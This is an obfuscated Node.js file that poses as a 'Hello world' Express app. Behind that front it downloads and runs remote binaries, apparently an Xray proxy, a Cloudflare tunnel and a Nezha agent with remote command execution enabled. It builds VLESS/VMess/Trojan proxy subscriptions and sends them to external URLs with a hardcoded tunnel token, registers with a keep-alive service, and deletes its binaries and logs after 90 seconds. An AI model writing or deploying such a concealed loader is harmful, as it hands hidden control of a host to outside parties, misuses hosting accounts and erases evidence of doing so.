function _0x48c8(_0x4b6394,_0x467b94){_0x4b6394=_0x4b6394-0x136;const _0x220747=_0x2207();let _0x48c871=_0x220747[_0x4b6394];return _0x48c871;}const _0x466dd0=_0x48c8;(function(_0x2502e0,_0x465cd0){const _0x260f03=_0x48c8,_0x269db7=_0x2502e0();while(!![]){try{const _0x419b1a=parseInt(_0x260f03(0x13d))/0x1+-parseInt(_0x260f03(0x156))/0x2*(-parseInt(_0x260f03(0x17d))/0x3)+-parseInt(_0x260f03(0x151))/0x4+parseInt(_0x260f03(0x189))/0x5*(-parseInt(_0x260f03(0x1e9))/0x6)+-parseInt(_0x260f03(0x1b6))/0x7+-parseInt(_0x260f03(0x16a))/0x8*(-parseInt(_0x260f03(0x18b))/0x9)+-parseInt(_0x260f03(0x193))/0xa*(-parseInt(_0x260f03(0x171))/0xb);if(_0x419b1a===_0x465cd0)break;else _0x269db7['push'](_0x269db7['shift']());}catch(_0x82007){_0x269db7['push'](_0x269db7['shift']());}}}(_0x2207,0x476b6));const express=require(_0x466dd0(0x1cc)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x466dd0(0x145)),exec=promisify(require('child_process')[_0x466dd0(0x1e2)]),{execSync}=require(_0x466dd0(0x19c)),UPLOAD_URL=process[_0x466dd0(0x14a)][_0x466dd0(0x146)]||'',PROJECT_URL=process['env'][_0x466dd0(0x197)]||'',AUTO_ACCESS=process['env'][_0x466dd0(0x168)]||![],FILE_PATH=process[_0x466dd0(0x14a)][_0x466dd0(0x16e)]||_0x466dd0(0x1ce),SUB_PATH=process['env']['SUB_PATH']||'sub',PORT=process[_0x466dd0(0x14a)][_0x466dd0(0x178)]||process['env']['PORT']||0xbb8,UUID=process[_0x466dd0(0x14a)][_0x466dd0(0x1ca)]||'2e6181c9-547a-434d-8d93-52dfaf64a262',NEZHA_SERVER=process[_0x466dd0(0x14a)][_0x466dd0(0x150)]||'',NEZHA_PORT=process[_0x466dd0(0x14a)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x466dd0(0x14a)][_0x466dd0(0x1a7)]||'',ARGO_DOMAIN=process[_0x466dd0(0x14a)][_0x466dd0(0x1c5)]||'leaflow.d.8.e.0.4.2.0.0.0.7.4.0.1.0.0.2.ip6.arpa',ARGO_AUTH=process['env']['ARGO_AUTH']||_0x466dd0(0x177),ARGO_PORT=process[_0x466dd0(0x14a)][_0x466dd0(0x1b0)]||0x1f41,CFIP=process[_0x466dd0(0x14a)][_0x466dd0(0x153)]||_0x466dd0(0x18e),CFPORT=process['env'][_0x466dd0(0x18c)]||0x1bb,NAME=process[_0x466dd0(0x14a)]['NAME']||_0x466dd0(0x16c);!fs[_0x466dd0(0x187)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x466dd0(0x1cd)](FILE_PATH+_0x466dd0(0x159))):console[_0x466dd0(0x1cd)](FILE_PATH+_0x466dd0(0x1b7));function generateRandomName(){const _0x443687=_0x466dd0,_0xd534b9=_0x443687(0x148);let _0x7375c='';for(let _0x352c28=0x0;_0x352c28<0x6;_0x352c28++){_0x7375c+=_0xd534b9[_0x443687(0x1bd)](Math[_0x443687(0x1d0)](Math[_0x443687(0x182)]()*_0xd534b9['length']));}return _0x7375c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x466dd0(0x15c)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x466dd0(0x18f)),listPath=path[_0x466dd0(0x15c)](FILE_PATH,_0x466dd0(0x1a1)),bootLogPath=path[_0x466dd0(0x15c)](FILE_PATH,'boot.log'),configPath=path[_0x466dd0(0x15c)](FILE_PATH,_0x466dd0(0x136));function deleteNodes(){const _0x214ab4=_0x466dd0;try{if(!UPLOAD_URL)return;if(!fs[_0x214ab4(0x187)](subPath))return;let _0xb5d6f4;try{_0xb5d6f4=fs[_0x214ab4(0x15f)](subPath,_0x214ab4(0x1d3));}catch{return null;}const _0x5a1869=Buffer[_0x214ab4(0x169)](_0xb5d6f4,_0x214ab4(0x176))['toString']('utf-8'),_0x12c200=_0x5a1869[_0x214ab4(0x13c)]('\x0a')[_0x214ab4(0x1a9)](_0x3e913d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3e913d));if(_0x12c200[_0x214ab4(0x144)]===0x0)return;return axios[_0x214ab4(0x18d)](UPLOAD_URL+_0x214ab4(0x141),JSON[_0x214ab4(0x157)]({'nodes':_0x12c200}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x42c283=>{return null;}),null;}catch(_0x55a483){return null;}}function cleanupOldFiles(){const _0x3ace96=_0x466dd0;try{const _0x19a257=fs['readdirSync'](FILE_PATH);_0x19a257[_0x3ace96(0x1de)](_0x58fd8c=>{const _0x95e978=_0x3ace96,_0x221932=path[_0x95e978(0x15c)](FILE_PATH,_0x58fd8c);try{const _0x29498c=fs['statSync'](_0x221932);_0x29498c['isFile']()&&fs[_0x95e978(0x190)](_0x221932);}catch(_0x4f5c5e){}});}catch(_0x48b8b7){}}app[_0x466dd0(0x167)]('/',function(_0x55c088,_0x2cf28e){const _0x2a79b9=_0x466dd0;_0x2cf28e[_0x2a79b9(0x16f)](_0x2a79b9(0x17c));});async function generateConfig(){const _0x236137=_0x466dd0,_0x600860={'log':{'access':_0x236137(0x1ba),'error':_0x236137(0x1ba),'loglevel':_0x236137(0x1c1)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x236137(0x1b2),'dest':0xbba},{'path':_0x236137(0x1c4),'dest':0xbbb},{'path':_0x236137(0x1a5),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x236137(0x140),'protocol':_0x236137(0x15d),'settings':{'clients':[{'id':UUID}],'decryption':_0x236137(0x1c1)},'streamSettings':{'network':'tcp','security':_0x236137(0x1c1)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x236137(0x15d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x236137(0x1c1)},'streamSettings':{'network':'ws','security':_0x236137(0x1c1),'wsSettings':{'path':_0x236137(0x1b2)}},'sniffing':{'enabled':!![],'destOverride':[_0x236137(0x1e0),_0x236137(0x17e),_0x236137(0x174)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x236137(0x14f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x236137(0x1e0),_0x236137(0x17e),_0x236137(0x174)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x236137(0x140),'protocol':_0x236137(0x19d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x236137(0x1c1),'wsSettings':{'path':_0x236137(0x1a5)}},'sniffing':{'enabled':!![],'destOverride':[_0x236137(0x1e0),'tls',_0x236137(0x174)],'metadataOnly':![]}}],'dns':{'servers':[_0x236137(0x13a)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x236137(0x139),'tag':_0x236137(0x162)}]};fs[_0x236137(0x194)](path[_0x236137(0x15c)](FILE_PATH,_0x236137(0x136)),JSON['stringify'](_0x600860,null,0x2));}function getSystemArchitecture(){const _0x123005=_0x466dd0,_0x3dfb45=os[_0x123005(0x1a8)]();return _0x3dfb45===_0x123005(0x1db)||_0x3dfb45===_0x123005(0x1ac)||_0x3dfb45===_0x123005(0x1cb)?_0x123005(0x1db):'amd';}function _0x2207(){const _0x3244df=['Download\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','/trojan-argo','https://amd64.ssss.nyc.mn/bot','NEZHA_KEY','arch','filter','Subscription\x20uploaded\x20successfully','\x0a\x20\x20credentials-file:\x20','arm64','unshift','nohup\x20','https://amd64.ssss.nyc.mn/v1','ARGO_PORT','boot.log','/vless-argo','https://arm64.ssss.nyc.mn/agent','&path=%2Fvless-argo%3Fed%3D2560#','substring','3460303GwqZAx','\x20already\x20exists','\x20is\x20running','Empowerment\x20success\x20for\x20','/dev/null','2087','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','charAt','ArgoDomain:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','NEZHA\x20variable\x20is\x20empty,skip\x20running','none','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/api/add-nodes','/vmess-argo','ARGO_DOMAIN','&path=%2Ftrojan-argo%3Fed%3D2560#','&fp=firefox&type=ws&host=','https://arm64.ssss.nyc.mn/v1','push','UUID','aarch64','express','log','./tmp','\x20-s\x20','floor','listen','/sub.txt\x20saved\x20successfully','utf-8','stream','Error\x20in\x20startserver:','pipe','data','2096','createWriteStream','error','arm','application/json','/api/add-subscriptions','forEach','443','http','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','exec','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Error\x20executing\x20command:\x20','clear','php\x20running\x20error:\x20','text/plain;\x20charset=utf-8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2700ijIBFe','--tls','config.json','tunnel.yml','/tunnel.yml\x20run','blackhole','https+local://8.8.8.8/dns-query','tunnel.json','split','543814VTwCmw','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','127.0.0.1','/api/delete-nodes','/config.json\x20>/dev/null\x202>&1\x20&','2053','length','util','UPLOAD_URL','config.yaml','abcdefghijklmnopqrstuvwxyz','https://oooo.serv00.net/add-url','env','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20tunnel:\x20','TunnelSecret','platform','vmess','NEZHA_SERVER','1198080uzJXwp','\x20>/dev/null\x202>&1\x20&','CFIP','automatic\x20access\x20task\x20added\x20successfully','message','2bZebyl','stringify','/vmess-argo?ed=2560','\x20is\x20created','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/web','join','vless','Unhandled\x20error\x20in\x20startserver:','readFileSync','\x0a\x20\x20\x20\x20','response','block','2083','\x20-p\x20','rm\x20-rf\x20','pkill\x20-f\x20\x22[','get','AUTO_ACCESS','from','32rbEKGC','pop','Leaflow','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','FILE_PATH','send','win32','6591904ECCgXv','has','?encryption=none&security=tls&sni=','quic','firefox','base64','eyJhIjoiMTNlMWJiNTU3ZDg2ZTRiMjU1YmM1NzM2ZjUxMjk3M2MiLCJ0IjoiNThjMjgyYjctOWY5ZC00OGM1LWE1YzctZWE3ZjAxYmRhYjUxIiwicyI6Ik9XSTBObU5sTnpRdE1tTmpPUzAwT1RjNExXRmxNemt0TnpBd09XVmpPRE14WlRSbSJ9','SERVER_PORT','https://amd64.ssss.nyc.mn/web','all','App\x20is\x20running','Hello\x20world!','808713yGYuwd','tls','toString','\x20failed:\x20','\x0a\x20\x20\x0atrojan://','random','map','status','8443','https://arm64.ssss.nyc.mn/bot','existsSync','https://amd64.ssss.nyc.mn/agent','4725EyqCgl','npm\x20running\x20error:\x20','222714pJmEhh','CFPORT','post','cdns.doon.eu.org','sub.txt','unlinkSync','set','trim','10DNcYlp','writeFileSync','close','includes','PROJECT_URL','\x0avless://','fileName','ARGO_DOMAIN:','Skipping\x20adding\x20automatic\x20access\x20task','child_process','trojan','match','Content-Type','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','list.txt','false'];_0x2207=function(){return _0x3244df;};return _0x2207();}function downloadFile(_0x4b2c41,_0x45a93d,_0x3c34da){const _0x364c57=_0x466dd0,_0x51a01c=_0x4b2c41;!fs[_0x364c57(0x187)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x49ba80=fs[_0x364c57(0x1d9)](_0x51a01c);axios({'method':_0x364c57(0x167),'url':_0x45a93d,'responseType':_0x364c57(0x1d4)})['then'](_0x1efbeb=>{const _0x4e3cf4=_0x364c57;_0x1efbeb[_0x4e3cf4(0x1d7)][_0x4e3cf4(0x1d6)](_0x49ba80),_0x49ba80['on']('finish',()=>{const _0x546eb8=_0x4e3cf4;_0x49ba80[_0x546eb8(0x195)](),console['log'](_0x546eb8(0x1a3)+path['basename'](_0x51a01c)+'\x20successfully'),_0x3c34da(null,_0x51a01c);}),_0x49ba80['on'](_0x4e3cf4(0x1da),_0x2488d6=>{const _0x47e5dc=_0x4e3cf4;fs['unlink'](_0x51a01c,()=>{});const _0x544fd8='Download\x20'+path['basename'](_0x51a01c)+'\x20failed:\x20'+_0x2488d6[_0x47e5dc(0x155)];console[_0x47e5dc(0x1da)](_0x544fd8),_0x3c34da(_0x544fd8);});})['catch'](_0x52423f=>{const _0x36d77b=_0x364c57,_0x223974=_0x36d77b(0x1a3)+path['basename'](_0x51a01c)+_0x36d77b(0x180)+_0x52423f[_0x36d77b(0x155)];console[_0x36d77b(0x1da)](_0x223974),_0x3c34da(_0x223974);});}async function downloadFilesAndRun(){const _0x5712c6=_0x466dd0,_0x151512=getSystemArchitecture(),_0x151e15=getFilesForArchitecture(_0x151512);if(_0x151e15[_0x5712c6(0x144)]===0x0){console[_0x5712c6(0x1cd)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5ad04c=_0x151e15[_0x5712c6(0x183)](_0xd7164d=>{return new Promise((_0x480bb9,_0x215f1b)=>{const _0x274fc7=_0x48c8;downloadFile(_0xd7164d[_0x274fc7(0x199)],_0xd7164d['fileUrl'],(_0x53f224,_0x1e38f7)=>{_0x53f224?_0x215f1b(_0x53f224):_0x480bb9(_0x1e38f7);});});});try{await Promise[_0x5712c6(0x17a)](_0x5ad04c);}catch(_0x1aea97){console[_0x5712c6(0x1da)]('Error\x20downloading\x20files:',_0x1aea97);return;}function _0x588f93(_0x578b46){const _0x42dfd3=_0x5712c6,_0x4801a6=0x1fd;_0x578b46[_0x42dfd3(0x1de)](_0x31725f=>{fs['existsSync'](_0x31725f)&&fs['chmod'](_0x31725f,_0x4801a6,_0x4d1f3e=>{const _0x3318cc=_0x48c8;_0x4d1f3e?console['error']('Empowerment\x20failed\x20for\x20'+_0x31725f+':\x20'+_0x4d1f3e):console[_0x3318cc(0x1cd)](_0x3318cc(0x1b9)+_0x31725f+':\x20'+_0x4801a6[_0x3318cc(0x17f)](0x8));});});}const _0x55a51b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x588f93(_0x55a51b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xf2224b=NEZHA_SERVER[_0x5712c6(0x196)](':')?NEZHA_SERVER['split'](':')[_0x5712c6(0x16b)]():'',_0x405f96=new Set(['443',_0x5712c6(0x185),_0x5712c6(0x1d8),'2087',_0x5712c6(0x163),_0x5712c6(0x143)]),_0x130529=_0x405f96[_0x5712c6(0x172)](_0xf2224b)?'true':_0x5712c6(0x1a2),_0x3d3a6b='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5712c6(0x1a0)+_0x130529+_0x5712c6(0x1e1)+UUID;fs[_0x5712c6(0x194)](path[_0x5712c6(0x15c)](FILE_PATH,_0x5712c6(0x147)),_0x3d3a6b);const _0x2f5d9f='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x5712c6(0x13f);try{await exec(_0x2f5d9f),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x4781c0=>setTimeout(_0x4781c0,0x3e8));}catch(_0x461ee4){console[_0x5712c6(0x1da)](_0x5712c6(0x1e6)+_0x461ee4);}}else{let _0x25f059='';const _0x239fd3=[_0x5712c6(0x1df),_0x5712c6(0x185),_0x5712c6(0x1d8),_0x5712c6(0x1bb),'2083',_0x5712c6(0x143)];_0x239fd3[_0x5712c6(0x196)](NEZHA_PORT)&&(_0x25f059=_0x5712c6(0x1ea));const _0x197e7b=_0x5712c6(0x1ae)+npmPath+_0x5712c6(0x1cf)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5712c6(0x164)+NEZHA_KEY+'\x20'+_0x25f059+_0x5712c6(0x1e8);try{await exec(_0x197e7b),console[_0x5712c6(0x1cd)](npmName+_0x5712c6(0x1b8)),await new Promise(_0x6bc28c=>setTimeout(_0x6bc28c,0x3e8));}catch(_0x24778e){console[_0x5712c6(0x1da)](_0x5712c6(0x18a)+_0x24778e);}}}else console['log'](_0x5712c6(0x1c0));const _0x481515=_0x5712c6(0x1ae)+webPath+'\x20-c\x20'+FILE_PATH+_0x5712c6(0x142);try{await exec(_0x481515),console[_0x5712c6(0x1cd)](webName+'\x20is\x20running'),await new Promise(_0x55fbe8=>setTimeout(_0x55fbe8,0x3e8));}catch(_0x29fcc6){console[_0x5712c6(0x1da)]('web\x20running\x20error:\x20'+_0x29fcc6);}if(fs['existsSync'](botPath)){let _0x4520fd;if(ARGO_AUTH[_0x5712c6(0x19e)](/^[A-Z0-9a-z=]{120,250}$/))_0x4520fd=_0x5712c6(0x1c2)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4520fd='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5712c6(0x138):_0x4520fd=_0x5712c6(0x1e3)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5712c6(0x1ae)+botPath+'\x20'+_0x4520fd+_0x5712c6(0x152)),console['log'](botName+_0x5712c6(0x1b8)),await new Promise(_0x4dcc0a=>setTimeout(_0x4dcc0a,0x7d0));}catch(_0x5ae5f3){console[_0x5712c6(0x1da)](_0x5712c6(0x1e4)+_0x5ae5f3);}}await new Promise(_0xcb1e68=>setTimeout(_0xcb1e68,0x1388));}function getFilesForArchitecture(_0x871f37){const _0x30e19e=_0x466dd0;let _0xf9f908;_0x871f37===_0x30e19e(0x1db)?_0xf9f908=[{'fileName':webPath,'fileUrl':_0x30e19e(0x15b)},{'fileName':botPath,'fileUrl':_0x30e19e(0x186)}]:_0xf9f908=[{'fileName':webPath,'fileUrl':_0x30e19e(0x179)},{'fileName':botPath,'fileUrl':_0x30e19e(0x1a6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x14a9e7=_0x871f37==='arm'?_0x30e19e(0x1b3):_0x30e19e(0x188);_0xf9f908['unshift']({'fileName':npmPath,'fileUrl':_0x14a9e7});}else{const _0x508661=_0x871f37==='arm'?_0x30e19e(0x1c8):_0x30e19e(0x1af);_0xf9f908[_0x30e19e(0x1ad)]({'fileName':phpPath,'fileUrl':_0x508661});}}return _0xf9f908;}function argoType(){const _0x7d8803=_0x466dd0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x7d8803(0x1cd)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x7d8803(0x196)](_0x7d8803(0x14d))){fs[_0x7d8803(0x194)](path['join'](FILE_PATH,_0x7d8803(0x13b)),ARGO_AUTH);const _0x3438e8=_0x7d8803(0x14c)+ARGO_AUTH[_0x7d8803(0x13c)]('\x22')[0xb]+_0x7d8803(0x1ab)+path[_0x7d8803(0x15c)](FILE_PATH,_0x7d8803(0x13b))+_0x7d8803(0x16d)+ARGO_DOMAIN+_0x7d8803(0x14b)+ARGO_PORT+_0x7d8803(0x15a);fs[_0x7d8803(0x194)](path[_0x7d8803(0x15c)](FILE_PATH,_0x7d8803(0x137)),_0x3438e8);}else console[_0x7d8803(0x1cd)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x16a43d=_0x466dd0;let _0x541f9f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x541f9f=ARGO_DOMAIN,console[_0x16a43d(0x1cd)](_0x16a43d(0x19a),_0x541f9f),await _0x21b82f(_0x541f9f);else try{const _0xd9b145=fs[_0x16a43d(0x15f)](path[_0x16a43d(0x15c)](FILE_PATH,_0x16a43d(0x1b1)),_0x16a43d(0x1d3)),_0x2187ab=_0xd9b145[_0x16a43d(0x13c)]('\x0a'),_0x4254d9=[];_0x2187ab['forEach'](_0x5ab7f1=>{const _0x399f72=_0x16a43d,_0x27cf23=_0x5ab7f1['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x27cf23){const _0x2dab65=_0x27cf23[0x1];_0x4254d9[_0x399f72(0x1c9)](_0x2dab65);}});if(_0x4254d9['length']>0x0)_0x541f9f=_0x4254d9[0x0],console[_0x16a43d(0x1cd)](_0x16a43d(0x1be),_0x541f9f),await _0x21b82f(_0x541f9f);else{console[_0x16a43d(0x1cd)](_0x16a43d(0x1bc)),fs[_0x16a43d(0x190)](path['join'](FILE_PATH,_0x16a43d(0x1b1)));async function _0x29eeb4(){const _0x30c73c=_0x16a43d;try{process[_0x30c73c(0x14e)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x30c73c(0x166)+botName[_0x30c73c(0x1bd)](0x0)+']'+botName[_0x30c73c(0x1b5)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x521c3e){}}_0x29eeb4(),await new Promise(_0x4aa2bc=>setTimeout(_0x4aa2bc,0xbb8));const _0x19665b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x16a43d(0x1bf)+ARGO_PORT;try{await exec(_0x16a43d(0x1ae)+botPath+'\x20'+_0x19665b+_0x16a43d(0x152)),console['log'](botName+_0x16a43d(0x1b8)),await new Promise(_0x57ebd1=>setTimeout(_0x57ebd1,0xbb8)),await extractDomains();}catch(_0x498065){console[_0x16a43d(0x1da)](_0x16a43d(0x1e4)+_0x498065);}}}catch(_0x3a7e4b){console[_0x16a43d(0x1da)]('Error\x20reading\x20boot.log:',_0x3a7e4b);}async function _0x21b82f(_0xaa5252){const _0xf69ffb=_0x16a43d,_0x5cbb0b=execSync(_0xf69ffb(0x1a4),{'encoding':'utf-8'}),_0x25e815=_0x5cbb0b[_0xf69ffb(0x192)](),_0x2add69=NAME?NAME+'-'+_0x25e815:_0x25e815;return new Promise(_0x1fe893=>{setTimeout(()=>{const _0x6e4f77=_0x48c8,_0x3a887a={'v':'2','ps':''+_0x2add69,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x6e4f77(0x1c1),'host':_0xaa5252,'path':_0x6e4f77(0x158),'tls':_0x6e4f77(0x17e),'sni':_0xaa5252,'alpn':'','fp':_0x6e4f77(0x175)},_0x1e4403=_0x6e4f77(0x198)+UUID+'@'+CFIP+':'+CFPORT+_0x6e4f77(0x173)+_0xaa5252+'&fp=firefox&type=ws&host='+_0xaa5252+_0x6e4f77(0x1b4)+_0x2add69+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x6e4f77(0x157)](_0x3a887a))['toString'](_0x6e4f77(0x176))+_0x6e4f77(0x181)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xaa5252+_0x6e4f77(0x1c7)+_0xaa5252+_0x6e4f77(0x1c6)+_0x2add69+_0x6e4f77(0x160);console[_0x6e4f77(0x1cd)](Buffer['from'](_0x1e4403)[_0x6e4f77(0x17f)](_0x6e4f77(0x176))),fs[_0x6e4f77(0x194)](subPath,Buffer[_0x6e4f77(0x169)](_0x1e4403)[_0x6e4f77(0x17f)](_0x6e4f77(0x176))),console[_0x6e4f77(0x1cd)](FILE_PATH+_0x6e4f77(0x1d2)),uploadNodes(),app[_0x6e4f77(0x167)]('/'+SUB_PATH,(_0x562b95,_0x430318)=>{const _0x35d133=_0x6e4f77,_0x325d2b=Buffer[_0x35d133(0x169)](_0x1e4403)[_0x35d133(0x17f)]('base64');_0x430318[_0x35d133(0x191)](_0x35d133(0x19f),_0x35d133(0x1e7)),_0x430318[_0x35d133(0x16f)](_0x325d2b);}),_0x1fe893(_0x1e4403);},0x7d0);});}}async function uploadNodes(){const _0xd65287=_0x466dd0;if(UPLOAD_URL&&PROJECT_URL){const _0x4473cc=PROJECT_URL+'/'+SUB_PATH,_0x2bfba3={'subscription':[_0x4473cc]};try{const _0xf140a2=await axios[_0xd65287(0x18d)](UPLOAD_URL+_0xd65287(0x1dd),_0x2bfba3,{'headers':{'Content-Type':_0xd65287(0x1dc)}});return _0xf140a2&&_0xf140a2['status']===0xc8?(console['log'](_0xd65287(0x1aa)),_0xf140a2):null;}catch(_0xc15499){if(_0xc15499[_0xd65287(0x161)]){if(_0xc15499[_0xd65287(0x161)][_0xd65287(0x184)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xd65287(0x187)](listPath))return;const _0x49e796=fs[_0xd65287(0x15f)](listPath,'utf-8'),_0xa2bcc0=_0x49e796[_0xd65287(0x13c)]('\x0a')['filter'](_0x32e8e1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x32e8e1));if(_0xa2bcc0[_0xd65287(0x144)]===0x0)return;const _0x1171bc=JSON[_0xd65287(0x157)]({'nodes':_0xa2bcc0});try{const _0x335e25=await axios['post'](UPLOAD_URL+_0xd65287(0x1c3),_0x1171bc,{'headers':{'Content-Type':_0xd65287(0x1dc)}});return _0x335e25&&_0x335e25['status']===0xc8?(console[_0xd65287(0x1cd)]('Nodes\x20uploaded\x20successfully'),_0x335e25):null;}catch(_0x33740d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x384e4a=_0x48c8,_0x18eb8c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x18eb8c[_0x384e4a(0x1c9)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x18eb8c[_0x384e4a(0x1c9)](phpPath);process[_0x384e4a(0x14e)]===_0x384e4a(0x170)?exec('del\x20/f\x20/q\x20'+_0x18eb8c[_0x384e4a(0x15c)]('\x20')+'\x20>\x20nul\x202>&1',_0x538beb=>{const _0x132ec3=_0x384e4a;console[_0x132ec3(0x1e5)](),console[_0x132ec3(0x1cd)](_0x132ec3(0x17b)),console[_0x132ec3(0x1cd)](_0x132ec3(0x13e));}):exec(_0x384e4a(0x165)+_0x18eb8c[_0x384e4a(0x15c)]('\x20')+'\x20>/dev/null\x202>&1',_0xa00099=>{const _0x129685=_0x384e4a;console[_0x129685(0x1e5)](),console[_0x129685(0x1cd)](_0x129685(0x17b)),console['log'](_0x129685(0x13e));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x11161d=_0x466dd0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x11161d(0x1cd)](_0x11161d(0x19b));return;}try{const _0x56f26d=await axios['post'](_0x11161d(0x149),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x11161d(0x1cd)](_0x11161d(0x154)),_0x56f26d;}catch(_0x119768){return console[_0x11161d(0x1da)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x119768['message']),null;}}async function startserver(){const _0x365fc2=_0x466dd0;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x285586){console[_0x365fc2(0x1da)](_0x365fc2(0x1d5),_0x285586);}}startserver()['catch'](_0x5c63c9=>{const _0x4fc276=_0x466dd0;console['error'](_0x4fc276(0x15e),_0x5c63c9);}),app[_0x466dd0(0x1d1)](PORT,()=>console[_0x466dd0(0x1cd)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
